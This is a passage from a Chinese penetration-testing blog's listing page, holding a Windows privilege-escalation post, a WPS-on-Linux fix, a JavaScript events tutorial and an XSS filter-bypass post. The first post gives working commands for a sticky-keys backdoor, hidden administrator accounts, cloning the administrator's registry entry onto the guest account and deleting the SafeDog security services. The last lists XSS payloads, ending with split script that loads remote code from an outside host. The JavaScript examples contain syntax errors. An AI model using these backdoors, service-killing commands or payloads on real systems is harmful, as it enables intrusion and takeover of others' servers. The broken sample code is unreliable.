<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy C:\sethc.exe C:\windows\system32\sethc.exe  </span><br><span class="line">copy C:\windows\system32\sethc.exe C:\windows\system32\dllcache\sethc.exe</span><br></pre></td></tr></table></figure>
</li>
<li><p>for循环添加帐号法</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /l %%i <span class="keyword">in</span> (1,1,100) <span class="keyword">do</span> @net user temp asphxg /add&amp;@net localgroup administrators temp /add</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改注册表法</p>
</li>
</ol>
<p>administrator对应值是1F4,GUEST是1F5。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(1)使用net1 user guset 1 ,将guest密码重置为1，无需过问是guest否禁用</span><br><span class="line"></span><br><span class="line">(2)执行：reg export &quot;HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4&quot; &quot;C:\RECYCLER\1.reg&quot;导出administrator的注册表值到某路径,修改内容，将&quot;V&quot;值删除，只留F值,将1F4修改为1F5,保存。</span><br><span class="line"></span><br><span class="line">(3)执行regedit /s C:\RECYCLER\1.reg 导入注册表就可以使用，guest 密码1登陆了。</span><br></pre></td></tr></table></figure></p>
<ol start="5">
<li><p>直接修改管理员密码法，尽量不用这招，实在没有办法就用这个。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user administrator somepwd</span><br></pre></td></tr></table></figure>
</li>
<li><p>删除与停止安全狗相关服务法</p>
</li>
</ol>
<p>如果是system权限可以采取以下方法停止安全狗</p>
<p>(1)停止安全狗相关服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net stop    <span class="string">"Safedog Guard Center"</span>  /y </span><br><span class="line">net stop    <span class="string">"Safedog Update Center"</span> /y </span><br><span class="line">net stop    <span class="string">"SafeDogCloudHelper"</span>  /y</span><br></pre></td></tr></table></figure></p>
<p>(2)直接删除SafeDogGuardCenter服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sc stop <span class="string">"SafeDogGuardCenter"</span>  </span><br><span class="line">sc config <span class="string">"SafeDogGuardCenter"</span> start= disabled  </span><br><span class="line">sc delete <span class="string">"SafeDogGuardCenter"</span> </span><br><span class="line"> </span><br><span class="line">sc stop <span class="string">" SafeDogUpdateCenter"</span>  </span><br><span class="line">sc config <span class="string">" SafeDogUpdateCenter"</span> start= disabled  </span><br><span class="line">sc delete <span class="string">" SafeDogUpdateCenter"</span> </span><br><span class="line"> </span><br><span class="line">sc stop <span class="string">" SafeDogCloudHelper"</span>  </span><br><span class="line">sc config <span class="string">" SafeDogCloudHelper"</span> start= disabled  </span><br><span class="line">sc delete <span class="string">" SafeDogCloudHelper"</span></span><br></pre></td></tr></table></figure></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/提权/">提权</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2017/10/17/linxu安装wps后无法启动的问题解决方法/" title="linxu安装wps后无法启动的问题解决方法" itemprop="url">linxu安装wps后无法启动的问题解决方法</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2017-10-17T05:56:24.000Z" itemprop="datePublished"> 发表于 2017-10-17</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>因为写论文的需要，我需要在linux安装wps，安装后启动wps发现提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libpng12.so.0: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure></p>
<p>刚开始我以为安装出了问题，于是重新安装，发现还是这样的问题。于是输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -ld $(locate -r libpng.*\.so.*)</span><br></pre></td></tr></table></figure></p>
<p>发现确实没有12的，网上查了才知道新版的linux已经没有libpng12的了，最低的都是15的，但是wps却是基于12的，所以我们只要网上下一个12的就可以了,附上下载链接，只需下载对应版本即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://rpmfind.net/linux/rpm2html/search.php?query=libpng12.so.0()(64bit)</span><br></pre></td></tr></table></figure></p>
<p>下载最后面的，然后使用下面命令进行解压<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm2cpio xxx.rpm | cpio -div</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/kingsoft/wps-office/office6/</span><br></pre></td></tr></table></figure>
<p>目录下</p>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>也没啥好总结的，对安装wps的各种问题汇总一下吧<br>安装wps后无法启动一般有三种情况<br><b>第一</b>，你是32位系统，但libstc++版本太低，如果从终端运行wps的话，会出现类似以下的错误提示:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;Cannot load library kso10:(/usr/lib/libstdc++.so.6:version`GLIBCXX_3.4.14` not found</span><br></pre></td></tr></table></figure></p>
<p>这个现象一般出现在比较旧的发行版本中，比如Debian Squeeze，Ubuntu 10.04。解决方法有两种：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">升级系统</span><br><span class="line">```bush</span><br><span class="line">sudo add-apt-repository ppa:ubuntu-toolchain-r/test</span><br></pre></td></tr></table></figure></p>
<p> 用于升级libstdc++库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:webupd8team/unstable</span><br></pre></td></tr></table></figure></p>
<p>  用于升级freetype库,Debian Squeeze请参考[[64bit系统安装办法]]；<br>从网上下载一个较新的libstdc++.so并放入/opt/kingsoft/wps-office/office6中</p>
<p><b>第二</b>,你是64位系统。目前wps仅在32位系统上编译，64位的系统需要安装32位的运行库，解决办法请参考[[64bit系统安装办法]]。<br><b>第三</b>,libpng版本太高。WPS编译依赖于libpng12，大部分发行版都已经升级到了libpng14或libpng15，而其中一些发行版升级后没有再带上旧版的libpng。终端运行的话，错误提示类似于:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/kingsoft/wps-office/office6/wps: error while loading shared libraries: libpng12.so.0: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure></p>
<p>可以从网上下一个libpng12.so放在/opt/kingsoft/wps-office/office6/目录下。</p>
<h5 id="我使用ibus输入法，但不能光标跟随或不能输入中文。"><a href="#我使用ibus输入法，但不能光标跟随或不能输入中文。" class="headerlink" title="我使用ibus输入法，但不能光标跟随或不能输入中文。"></a>我使用ibus输入法，但不能光标跟随或不能输入中文。</h5><p> 这是qt没配置好导致的，首先确保你的ibus是1.41以上的稳定版，然后安装一个qt-config，运行qtconfig，切换到Interface选项卡，在”XIM Input Style:”下拉菜单中选择”Over The Spot”，在”Default Input Method:”下拉菜单中选择”XIM”。<br>A7中带了et，但为什么我安装后看不到？(在A7p1中已修复)<br>由于A7中et的desktop文件编辑不当，在KDE等一些桌面环境中会出现找不到et图标的问题，在另一些系统环境中则被归类到“其他”。<br>解决方法如下：<br>编辑<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/applications/wps-office-et.desktop</span><br></pre></td></tr></table></figure></p>
<p>文件，在其中添加一行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Categories=Office;Spreadsheets;Qt;</span><br></pre></td></tr></table></figure></p>
<p>为什么中键粘贴不能用，为什么stardict不能在文档中取词？<br>这都是因为a6及以前的wps for linux没有访问到XWindow的PRIMARY selection剪贴板，wps for Linux是从Windows<sup>&reg;</sup>版迁移过来的，迁移时并没有考虑到这个问题。目前开发人员已经解决这个问题，并已在a7的wps文字中加入支持。</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/杂七杂八/">杂七杂八</a>►<a class="article-category-link" href="/categories/杂七杂八/工具/">工具</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2017/09/28/JavaScript异常及处理事件/" title="JavaScript异常及事件处理" itemprop="url">JavaScript异常及事件处理</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2017-09-28T08:42:19.000Z" itemprop="datePublished"> 发表于 2017-09-28</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h3 id="JavaScript异常及事件处理"><a href="#JavaScript异常及事件处理" class="headerlink" title="JavaScript异常及事件处理"></a>JavaScript异常及事件处理</h3><p>异常捕获<br>a,异常：<br>当JavaScript引擎执行JavaScript代码时，发生了错误，导致程序停止运行<br>b,异常抛出：<br>当异常产生，并将这个异常生成一个错误信息<br>c,异常捕获：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">	发生异常的代码块；</span><br><span class="line">&#125;catch(err)&#123;</span><br><span class="line">	错误信息处理；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;form&gt;</span><br><span class="line">		&lt;input id=&quot;text&quot; type=&quot;text&quot;&gt;</span><br><span class="line">		&lt;input id=&quot;btn&quot; type=&quot;button&quot; onclick=&quot;demo()&quot; value=&quot;按钮&quot;&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	&lt;script&gt;</span><br><span class="line">		function demo()&#123;</span><br><span class="line">			try&#123;</span><br><span class="line">				var e = document.getElementById(&quot;text&quot;).value;</span><br><span class="line">				if(e==&quot;&quot;)&#123;</span><br><span class="line">					throw &quot;请输入&quot;;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure></p>
<p>当输入空格时弹出错误提醒</p>
<h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><p>事件是可以被JavaScript侦测到的行为<br>常见的事件:</p>
<table>
<thead>
<tr>
<th>事件名</th>
<th>中文名</th>
</tr>
</thead>
<tbody>
<tr>
<td>onclick</td>
<td>单击事件</td>
</tr>
<tr>
<td>onMouseOver</td>
<td>鼠标经过事件</td>
</tr>
<tr>
<td>onMouseOut</td>
<td>鼠标移出事件</td>
</tr>
<tr>
<td>onChange</td>
<td>文本内容改变事件</td>
</tr>
<tr>
<td>onSelect</td>
<td>文本框选中事件</td>
</tr>
<tr>
<td>onFocus</td>
<td>光标聚集事件</td>
</tr>
<tr>
<td>onBlur</td>
<td>移开光标事件</td>
</tr>
<tr>
<td>inLoad</td>
<td>网页加载事件</td>
</tr>
<tr>
<td>onUnload</td>
<td>关闭网页事件</td>
</tr>
</tbody>
</table>
<p>例：在同目录建立一个style.css文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">	width: 100px;</span><br><span class="line">	height:100px;</span><br><span class="line">	background-color; cadetblue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>html代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;事件&lt;/title&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; type=&quot;rext/css&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;div&quot; onmouseout=&quot;onOut(this)&quot; onmouseover=&quot;onOver(this)&quot;&gt;&lt;/div&gt;</span><br><span class="line">	&lt;script&gt;</span><br><span class="line">		function.onOver(ooj)&#123;</span><br><span class="line">			ooj.innerHTML=&quot;Hello&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		function.onOut(ooj)&#123;</span><br><span class="line">			ooj.innerHTML=&quot;world&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&lt;/script&gt;</span><br><span class="line">	&lt;form&gt;</span><br><span class="line">		&lt;input type=&quot;text&quot; onchange=&quot;alert(&apos;hello&apos;)&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;text&quot; onselect=&quot;changDemo(this)&quot; onfocus=&quot;changeDemo2(this)&quot;&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	&lt;script&gt;</span><br><span class="line">		function changeDemo(bg)&#123;</span><br><span class="line">			bg.style.background=&quot;red&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		function.changDemo2(bg)&#123;</span><br><span class="line">			bg.style.background=&quot;blue&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		function mgs()&#123;</span><br><span class="line">			alert(&quot;网页加载完毕&quot;)；</span><br><span class="line">		&#125;</span><br><span class="line">	&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/编程开发/">编程开发</a>►<a class="article-category-link" href="/categories/编程开发/javascript/">javascript</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2017/09/28/绕过XSS-Filter及其它一些XSS构造方法/" title="绕过XSS-Filter" itemprop="url">绕过XSS-Filter</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2017-09-28T08:42:19.000Z" itemprop="datePublished"> 发表于 2017-09-28</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>XSS-Filter一般是基于黑白名单的安全过滤策略，既把要处理的数据分成白名单和黑名单两大列表，白名单是可信数据，黑名单则相反。假定某个程序基于黑名单式的过滤策略，那么，当用户提交信息时，该系统的XSS-Filter会对所有数据进行检验，如检测到黑名单的数据，便进行拦截，编码和消毒过滤处理。<br>简单的来说，XSS-Filter实际上就是一段过滤函数。这段代码的功能封装在filter_xss()中，只要程序在处理输入时尽量使用该函数，就可以过滤常见的XSS。下面介绍一些常见的绕过方式。</p>
<h3 id="1，利用-lt-gt-标记注射Html-Javascript。"><a href="#1，利用-lt-gt-标记注射Html-Javascript。" class="headerlink" title="1，利用&lt;&gt;标记注射Html/Javascript。"></a>1，利用&lt;&gt;标记注射Html/Javascript。</h3><p>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(‘xss’);&lt;script&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="2，利用标签属性执行XSS"><a href="#2，利用标签属性执行XSS" class="headerlink" title="2，利用标签属性执行XSS"></a>2，利用标签属性执行XSS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=”javascript:alert(/xss/)”&gt;&lt;/table&gt;</span><br><span class="line">&lt;img src=”javascript:alert(‘xss’)”&gt;</span><br><span class="line">href=</span><br><span class="line">lowsrc=</span><br><span class="line">bgsound=</span><br><span class="line">background=</span><br><span class="line">value=</span><br><span class="line">action=</span><br><span class="line">dynsrc=</span><br></pre></td></tr></table></figure>
<p>等都可以测试，但是前提是浏览器要支持伪协议</p>
<h3 id="3，空格，回车，Tab"><a href="#3，空格，回车，Tab" class="headerlink" title="3，空格，回车，Tab"></a>3，空格，回车，Tab</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=”javas	cript:alert(/xss/)” width=100&gt;</span><br><span class="line">&lt;img src=”javas</span><br><span class="line">cript:</span><br><span class="line">alert(/xss/)” width=100&gt;</span><br></pre></td></tr></table></figure>
<h3 id="4-对标签属性值转码，因为HTML支持ASCII码的特性"><a href="#4-对标签属性值转码，因为HTML支持ASCII码的特性" class="headerlink" title="4,对标签属性值转码，因为HTML支持ASCII码的特性"></a>4,对标签属性值转码，因为HTML支持ASCII码的特性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=”javascript&amp;116&amp;#58alert(/xss/)”&gt;</span><br></pre></td></tr></table></figure>
<p>自己根据ASCII码可以自己修改，当然了，也可以综合上面的Tab键使用</p>
<h3 id="5，产生自己的事件"><a href="#5，产生自己的事件" class="headerlink" title="5，产生自己的事件"></a>5，产生自己的事件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=”#” onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>
<p>注：onerror事件是IMG标记的一个事件，只要页面中发生错误，该事件立刻被激活。因为图片地址不正确，所有也被激活了<br>还有许多事件可以利用，下面只是一部分，感兴趣的可以自己再网上了解一下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">onResume</span><br><span class="line">onSeek</span><br><span class="line">onTimeError</span><br><span class="line">onURLFlip</span><br></pre></td></tr></table></figure></p>
<h3 id="6，利用CSS跨站剖析。"><a href="#6，利用CSS跨站剖析。" class="headerlink" title="6，利用CSS跨站剖析。"></a>6，利用CSS跨站剖析。</h3><p>XSS脚本的另一个载体是CSS样式表，使用CSS样式表执行JavaScript具有隐蔽，灵活多变等特点，但是CSS样式表有一个很大的缺点：各浏览器之间不能通用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-image:url(javascript:alert(&apos;xss&apos;))&quot;&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">	body &#123;background-image: url(&quot;javascript:alert(&apos;xss&apos;)&quot;);&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div style=&quot;width: expreeion(alert(&apos;xss&apos;));&quot;&gt;</span><br><span class="line">&lt;img src=&quot;#&quot; style=&quot;xss:expreesion(alert(/xss/));&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>注：expreession执行JavaScript代码，expreession用来把css属性和jiavascript表达式关联起来。</p>
<h3 id="7，扰乱过滤规则"><a href="#7，扰乱过滤规则" class="headerlink" title="7，扰乱过滤规则"></a>7，扰乱过滤规则</h3><p>其实就是综合前面讲述的各种技巧<br>转换大小写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG src=&quot;javascript:alter(0);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>大小写混写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iMg sRC=&quot;jAvAscript:alert(0);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>不用双引号用单引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&apos;javascript:alerta(0);&apos;&gt;</span><br></pre></td></tr></table></figure></p>
<p>不使用引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javascript:alert(0);&gt;</span><br></pre></td></tr></table></figure></p>
<p>用个反斜杠<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=&quot;mars.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim&quot;alt=&quot;mars&quot;&gt;</span><br><span class="line">&lt;img/src=&quot;javascript:alter(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>8，利用字符编码<br>利用XSS编码工具可以对XSS进行编码，javascript支持Unicode，escapes，十六进制，八进制等编码形式<br>9，拆分跨站法<br>有的地方存在XSS漏洞，但是网站管理员对字符长度写入做了限制，那么就可以用该方法绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=&apos;document.&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;write(&quot;&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;&lt;script&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos; src=ht&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;tp://ww&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;.net/1.&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;js&gt;&lt;/sc&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;ript&gt;&quot;)&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=eval(z)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>上述代码的作用是引入一个字符串变量z，并且将下行代码拆分开来<br><code>bush
document.write(&quot;&lt;script src=http://www.shell.net/1.js&gt;&lt;/script&gt;&quot;)
`</code></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/XSS/">XSS</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>







  <nav id="page-nav" class="clearfix">
    <a class="extend prev" rel="prev" href="/"><span></span>Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/">Next<span></span></a>
  </nav>

</div>
      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
<aside class="clearfix">

  


  
<div class="category-block">
  <h3 class="asidetitle">分类</h3>
     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SEO/">SEO</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/SEO/反向代理/">反向代理</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/php代码审计/">php代码审计</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/">杂七杂八</a><span class="category-list-count">11</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/hexo/">hexo</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/parrot/">parrot</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/rad-linux/">rad linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/windows7/">windows7</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/工具/">工具</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a><span class="category-list-count">38</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/CMS/">CMS</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/XSS/">XSS</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/上传/">上传</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/其他/">其他</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/内网/">内网</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/工具/">工具</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/提取/">提取</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/提权/">提权</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/注入/">注入</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/端口/">端口</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/笔记/">笔记</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/资源/">资源</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/">编程开发</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/Python/">Python</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/javascript/">javascript</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/逆向工程/">逆向工程</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/逆向工程/mips/">mips</a><span class="category-list-count">1</span></li></ul></li></ul>
</div>


  

  <div class="linkslist">
  <p class="asidetitle">友情链接</p>
    <ul>
        
          <li>
            
            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
            
          </li>
        
          <li>
            
            	<a href="https://dillinger.io" target="_blank" title="在线看makedown编译出的效果">makedown</a>
            
          </li>
        
          <li>
            
